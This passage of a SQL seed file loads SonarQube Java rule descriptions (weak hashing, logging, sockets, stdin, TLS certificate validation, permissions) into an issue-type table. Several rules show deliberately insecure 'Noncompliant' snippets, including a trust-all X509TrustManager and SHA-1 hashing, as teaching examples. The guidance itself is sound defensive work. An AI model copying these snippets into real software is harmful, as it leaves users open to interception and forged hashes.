import java.util.Properties;
import org.apache.commons.crypto.utils.Utils;
import org.apache.commons.crypto.cipher.CryptoCipherFactory;
import org.apache.commons.crypto.cipher.CryptoCipherFactory.CipherProvider;

Properties properties = new Properties();
properties.setProperty(CryptoCipherFactory.CLASSES_KEY, CipherProvider.OPENSSL.getClassName());
final String transform = "AES/CBC/PKCS5Padding";
Utils.getCipherInstance(transform, properties);  // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/321.html">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/322.html">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/323.html">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/324.html">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/325.html">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS4426''>S4426</a>, <a href=''/coding_rules#rule_key=java%3AS5542''>S5542</a>, <a href=''/coding_rules#rule_key=java%3AS5547''>S5547</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4790', 'Using weak hashing algorithms is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc ...). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it''s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
MessageDigest md1 = MessageDigest.getInstance("SHA");  // Sensitive:  SHA is not a standard name, for most security providers it''s an alias of SHA-1
MessageDigest md2 = MessageDigest.getInstance("SHA1");  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md1 = MessageDigest.getInstance("SHA-512"); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/916.html">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4792', 'Configuring loggers is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285">CVE-2018-0285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127">CVE-2000-1127</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113">CVE-2017-15113</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn''t have its loggers in "debug" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn''t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don''t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>
<pre>
// === Log4J 2 ===
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.*;
import org.apache.logging.log4j.core.config.*;

// Sensitive: creating a new custom configuration
abstract class CustomConfigFactory extends ConfigurationFactory {
    // ...
}

class A {
    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,
            Appender appender, java.io.InputStream stream, java.net.URI uri,
            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)
            throws java.io.IOException {
        // Creating a new custom configuration
        ConfigurationBuilderFactory.newConfigurationBuilder();  // Sensitive

        // Setting loggers level can result in writing sensitive information in production
        Configurator.setAllLevels("com.example", Level.DEBUG);  // Sensitive
        Configurator.setLevel("com.example", Level.DEBUG);  // Sensitive
        Configurator.setLevel(levelMap);  // Sensitive
        Configurator.setRootLevel(Level.DEBUG);  // Sensitive

        config.addAppender(appender); // Sensitive: this modifies the configuration

        LoggerConfig loggerConfig = config.getRootLogger();
        loggerConfig.addAppender(appender, level, filter); // Sensitive
        loggerConfig.setLevel(level); // Sensitive

        context.setConfigLocation(uri); // Sensitive

        // Load the configuration from a stream or file
        new ConfigurationSource(stream);  // Sensitive
        new ConfigurationSource(stream, file);  // Sensitive
        new ConfigurationSource(stream, url);  // Sensitive
        ConfigurationSource.fromResource(source, loader);  // Sensitive
        ConfigurationSource.fromUri(uri);  // Sensitive
    }
}
</pre>
<pre>
// === java.util.logging ===
import java.util.logging.*;

class M {
    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)
            throws SecurityException, java.io.IOException {
        logManager.readConfiguration(is); // Sensitive

        logger.setLevel(Level.FINEST); // Sensitive
        logger.addHandler(handler); // Sensitive
    }
}
</pre>
<pre>
// === Logback ===
import ch.qos.logback.classic.util.ContextInitializer;
import ch.qos.logback.core.Appender;
import ch.qos.logback.classic.joran.JoranConfigurator;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.classic.*;

class M {
    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {
        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, "config.xml"); // Sensitive
        JoranConfigurator configurator = new JoranConfigurator(); // Sensitive

        logger.addAppender(fileAppender); // Sensitive
        logger.setLevel(Level.DEBUG); // Sensitive
    }
}
</pre>
<h2>Exceptions</h2>
<p>Log4J 1.x is not covered as it has reached <a href="https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces">end of
life</a>.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/532.html">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/117.html">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/778.html">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4818', 'Using Sockets is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785">CVE-2011-178</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645">CVE-2017-5645</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
// === java.net ===
import java.net.Socket;
import java.net.InetAddress;
import java.net.Proxy;
import java.net.ServerSocket;
import javax.net.SocketFactory;

class A {
    void foo(SocketFactory factory, String address, int port, InetAddress localAddr, int localPort, boolean stream,
            String host, Proxy proxy, int backlog, InetAddress bindAddr)
            throws Exception {
        new Socket(); // Sensitive.
        new Socket(address, port); // Sensitive.
        new Socket(address, port, localAddr, localPort); // Sensitive.
        new Socket(host, port, stream); // Sensitive.
        new Socket(proxy); // Sensitive.
        new Socket(host, port); // Sensitive.
        new Socket(host, port, stream); // Sensitive.
        new Socket(host, port, localAddr, localPort); // Sensitive.

        new ServerSocket(); // Sensitive.
        new ServerSocket(port); // Sensitive.
        new ServerSocket(port, backlog); // Sensitive.
        new ServerSocket(port, backlog, bindAddr); // Sensitive.

        factory.createSocket(); // Sensitive
    }
}

abstract class mySocketFactory extends SocketFactory { // Sensitive. Review how the sockets are created.
    // ...
}
</pre>
<pre>
// === java.nio.channels ===
import java.net.SocketAddress;
import java.nio.channels.AsynchronousChannelGroup;
import java.nio.channels.AsynchronousServerSocketChannel;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.SocketChannel;
import java.nio.channels.ServerSocketChannel;

class A {
    void foo(AsynchronousChannelGroup group, SocketAddress remote) throws Exception {
        AsynchronousServerSocketChannel.open(); // Sensitive.
        AsynchronousServerSocketChannel.open(group); // Sensitive.
        AsynchronousSocketChannel.open(); // Sensitive.
        AsynchronousSocketChannel.open(group); // Sensitive.
        SocketChannel.open(); // Sensitive.
        SocketChannel.open(remote); // Sensitive.
        ServerSocketChannel.open(); // Sensitive.
    }
}
</pre>
<pre>
// === Netty ===
import io.netty.channel.ChannelInitializer;
import io.netty.channel.socket.ServerSocketChannel;
import io.netty.channel.socket.SocketChannel;

class CustomChannelInitializer extends ChannelInitializer&lt;ServerSocketChannel&gt; { // Sensitive. Review how the SocketChannel is used.
    @Override
    protected void initChannel(ServerSocketChannel ch) throws Exception {
    }
}

class A {
    void foo() {
        new ChannelInitializer&lt;SocketChannel&gt;() {  // Sensitive
            @Override
            public void initChannel(SocketChannel ch) throws Exception {
                // ...
            }
        };
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/20">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/400">MITRE, CWE-400</a> - Uncontrolled Resource Consumption (''Resource Exhaustion'') </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/200">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4823', 'Using command line arguments is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281">CVE-2018-7281</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326">CVE-2018-12326</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process'' standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<p>This rule raises an issue as soon as there is a reference to argv, be it for direct use or via a CLI library like JCommander, GetOpt or Apache
CLI.</p>
<pre>
public class Main {
  public static void main (String[] argv) {
    String option = argv[0]; &nbsp;// Sensitive: check how the argument is used
  }
}
</pre>
<pre>
// === JCommander ===
import&nbsp;com.beust.jcommander.*;

public class Main {
  public static void main (String[] argv) {
    Main main = new Main();
    JCommander.newBuilder()
      .addObject(main)
      .build()
      .parse(argv); // Sensitive
    main.run();
  }
}
</pre>
<pre>
// === GNU Getopt ===
import gnu.getopt.Getopt;

public class Main {
  public static void main (String[] argv) {
    Getopt g = new Getopt("myprog", argv, "ab"); // Sensitive
  }
}
</pre>
<pre>
// === Apache CLI ===
import org.apache.commons.cli.*;

public class Main {
  public static void main (String[] argv) {
    Options options = new Options();
    CommandLineParser parser = new DefaultParser();
    try {
      CommandLine line = parser.parse(options, argv); // Sensitive
    }
  }
}
</pre>
<p>In the case of Args4J, an issue is created on the <code>public void run</code> method of any class using <code>org.kohsuke.args4j.Option</code> or
<code>org.kohsuke.args4j.Argument</code>.</p>
<p>Such a class is called directly by <code>org.kohsuke.args4j.Starter</code> outside of any <code>public static void main</code> method. If the class
has no <code>run</code> method, no issue will be raised as there must be a <code>public static void main</code> and its argument is already
highlighted.</p>
<pre>
// === argv4J ===
import org.kohsuke.args4j.Option;
import org.kohsuke.args4j.Argument;

public class Main {
  @Option(name="-myopt",usage="An option")
  public String myopt;

  @Argument(usage = "An argument", metaVar = "&lt;myArg&gt;")
  String myarg;

  String file;

  @Option(name="-file")
  public void setFile(String file) {
    this.file = file;
  }

  String arg2;

  @Argument(index=1)
  public void setArg2(String arg2) {
    this.arg2 = arg2;
  }

  public void run() { // Sensitive: This function
     myarg.toString(); // check how this argument is used
  }
}
</pre>
<h2>Exceptions</h2>
<p>The support of Argv4J without the use of <code>org.kohsuke.argv4j.Option</code> is out of scope as there is no way to know which Bean will be used
as the mainclass.</p>
<p>No issue will be raised on <code>public static void main(String[] argv)</code> if <code>argv</code> is not referenced in the method.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/88.html">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/214.html">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4829', 'Reading the Standard Input is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337">CVE-2005-2337</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
class A {
    void foo(String fmt, Object args) throws Exception {
        // Sensitive. Check how the standard input is used.
        System.in.read();

        // Sensitive. Check how safe this new InputStream is.
        System.setIn(new java.io.FileInputStream("test.txt"));

        java.io.Console console = System.console();
        // Sensitive. All the following calls should be reviewed as they use the standard input.
        console.reader();
        console.readLine();
        console.readLine(fmt, args);
        console.readPassword();
        console.readPassword(fmt, args);
    }
}
</pre>
<h2>Exceptions</h2>
<p>All references to <code>System.in</code> will create issues except direct calls to <code>System.in.close()</code>.</p>
<p>Command line parsing libraries such as JCommander often read standard input when asked for passwords. However this rule doesn''t raise any issue in
this case as another hotspot rule covers command line arguments.</p>
<h2>See:</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/20.html">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4830', 'Server certificates should be verified during SSL/TLS connections', 'sonarqube', 'Vulnerability', '<p>Validation of X.509 certificates is essential to create secure SSL/TLS sessions not vulnerable to man-in-the-middle attacks. </p>
<p>The certificate chain validation includes these steps:</p>
<ul>
  <li> The certificate is issued by its parent Certificate Authority or the root CA trusted by the system. </li>
  <li> Each CA is allowed to issue certificates. </li>
  <li> Each certificate in the chain is not expired. </li>
</ul>
<p>This rule raises an issue when an implementation of X509TrustManager is not controlling the validity of the certificate (ie: no exception is
raised). Empty implementations of the <code>X509TrustManager</code> interface are often created to disable certificate validation. The correct
solution is to provide an appropriate trust store.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class TrustAllManager implements X509TrustManager {

    @Override
    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {  // Noncompliant, nothing means trust any client
    }

    @Override
    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Noncompliant, this method never throws exception, it means trust any server
        LOG.log(Level.SEVERE, ERROR_MESSAGE);
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return null;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4834', 'Controlling permissions is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999">CVE-2018-12999</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285">CVE-2018-10285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions. The goal is to guide security code reviews.</p>
<p>More specifically it will raise issues on the following Spring code:</p>
<ul>
  <li> The definition of any class implementing interfaces
    <ul>
      <li> <code>org.springframework.security.access.AccessDecisionVoter</code> </li>
      <li> <code>org.springframework.security.access.AccessDecisionManager</code> </li>
      <li> <code>org.springframework.security.access.AfterInvocationProvider</code> </li>
      <li> <code>org.springframework.security.access.PermissionEvaluator</code> </li>
      <li> <code>org.springframework.security.access.expression.SecurityExpressionOperations</code> </li>
      <li> <code>org.springframework.security.access.expression.method.MethodSecurityExpressionHandler</code> </li>
      <li> <code>org.springframework.security.core.GrantedAuthority</code> </li>
      <li> <code>org.springframework.security.acls.model.PermissionGrantingStrategy</code> </li>
    </ul> </li>
  <li> The definition of any class extending class
    <ul>
      <li> <code>org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration</code> </li>
    </ul> </li>
  <li> Any method annotated with
    <ul>
      <li> Pre-post annotations: <code>@PreAuthorize</code>, <code>@PreFilter</code>, <code>@PostAuthorize</code> or <code>@PostFilter</code> from
      <code>org.springframework.security.access.prepost</code> package. </li>
      <li> <code>@org.springframework.security.access.annotation.Secured</code> </li>
    </ul> </li>
  <li> Calls to any of the following methods
    <ul>
      <li> <code>org.springframework.security.acls.model.MutableAclService</code>: <code>createAcl</code>, <code>deleteAcl</code>,
      <code>updateAcl</code> </li>
      <li> <code>org.springframework.security.config.annotation.web.builders.HttpSecurity</code>: <code>authorizeRequests</code> </li>
    </ul> </li>
  <li> The instantiation of an anonymous class implementing <code>org.springframework.security.core.GrantedAuthority</code> or of any class
  implementing this interface directly. </li>
</ul>
<p>It will also raise issue on JSR-250 annotations <code>@RolesAllowed</code>, <code>@PermitAll</code> and <code>@DenyAll</code> from
<code>javax.annotation.security</code> package.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li>
  <li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval
  ...). </li>
  <li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>At minimum, an access control system should:</p>
<ul>
  <li> Use a well-defined access control model like <a href="https://en.wikipedia.org/wiki/Role-based_access_control">RBAC</a> or <a
  href="https://en.wikipedia.org/wiki/Access-control_list">ACL</a>. </li>
  <li> Entities'' permissions should be reviewed regularly to remove permissions that are no longer needed. </li>
  <li> Respect <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a> ("_an entity has access only
  the information and resources that are necessary for its legitimate purpose_"). </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Boken Access Control </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/276.html">MITRE, CWE-276</a> - Incorrect Default Permissions </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/732.html">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/668.html">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/277.html">MITRE, CWE-277</a> - Insecure Inherited Permissions </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4838', 'An iteration on a Collection should be performed on the type handled by the Collection', 'sonarqube', 'Code Smell', '<p>This rule raises an issue when an iteration over the items of a <code>Collection</code> is performed on a super-type of the type handled by the
<code>Collection</code>.</p>
<p>Relying on <code>Object</code> or any classes between <code>Object</code> and the real class handled by the <code>Collection</code> is not
recommended. While it''s accepted by the language, this practice reduces readability of the code and forces to down-cast the item of the
<code>Collection</code> to be able to call a method on it while simply using the correct type in the iteration makes things more clear and simple.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Collection&lt;Person&gt; getPersons() { ... }

for (Object item : getPersons()) { // Noncompliant
  Person person = (Person) item; // Noncompliant; it''s required to down-cast to the to correct type to use "item"
  person.getAdress();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (Person person : getPersons()) { // Compliant
  person.getAddress() ;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
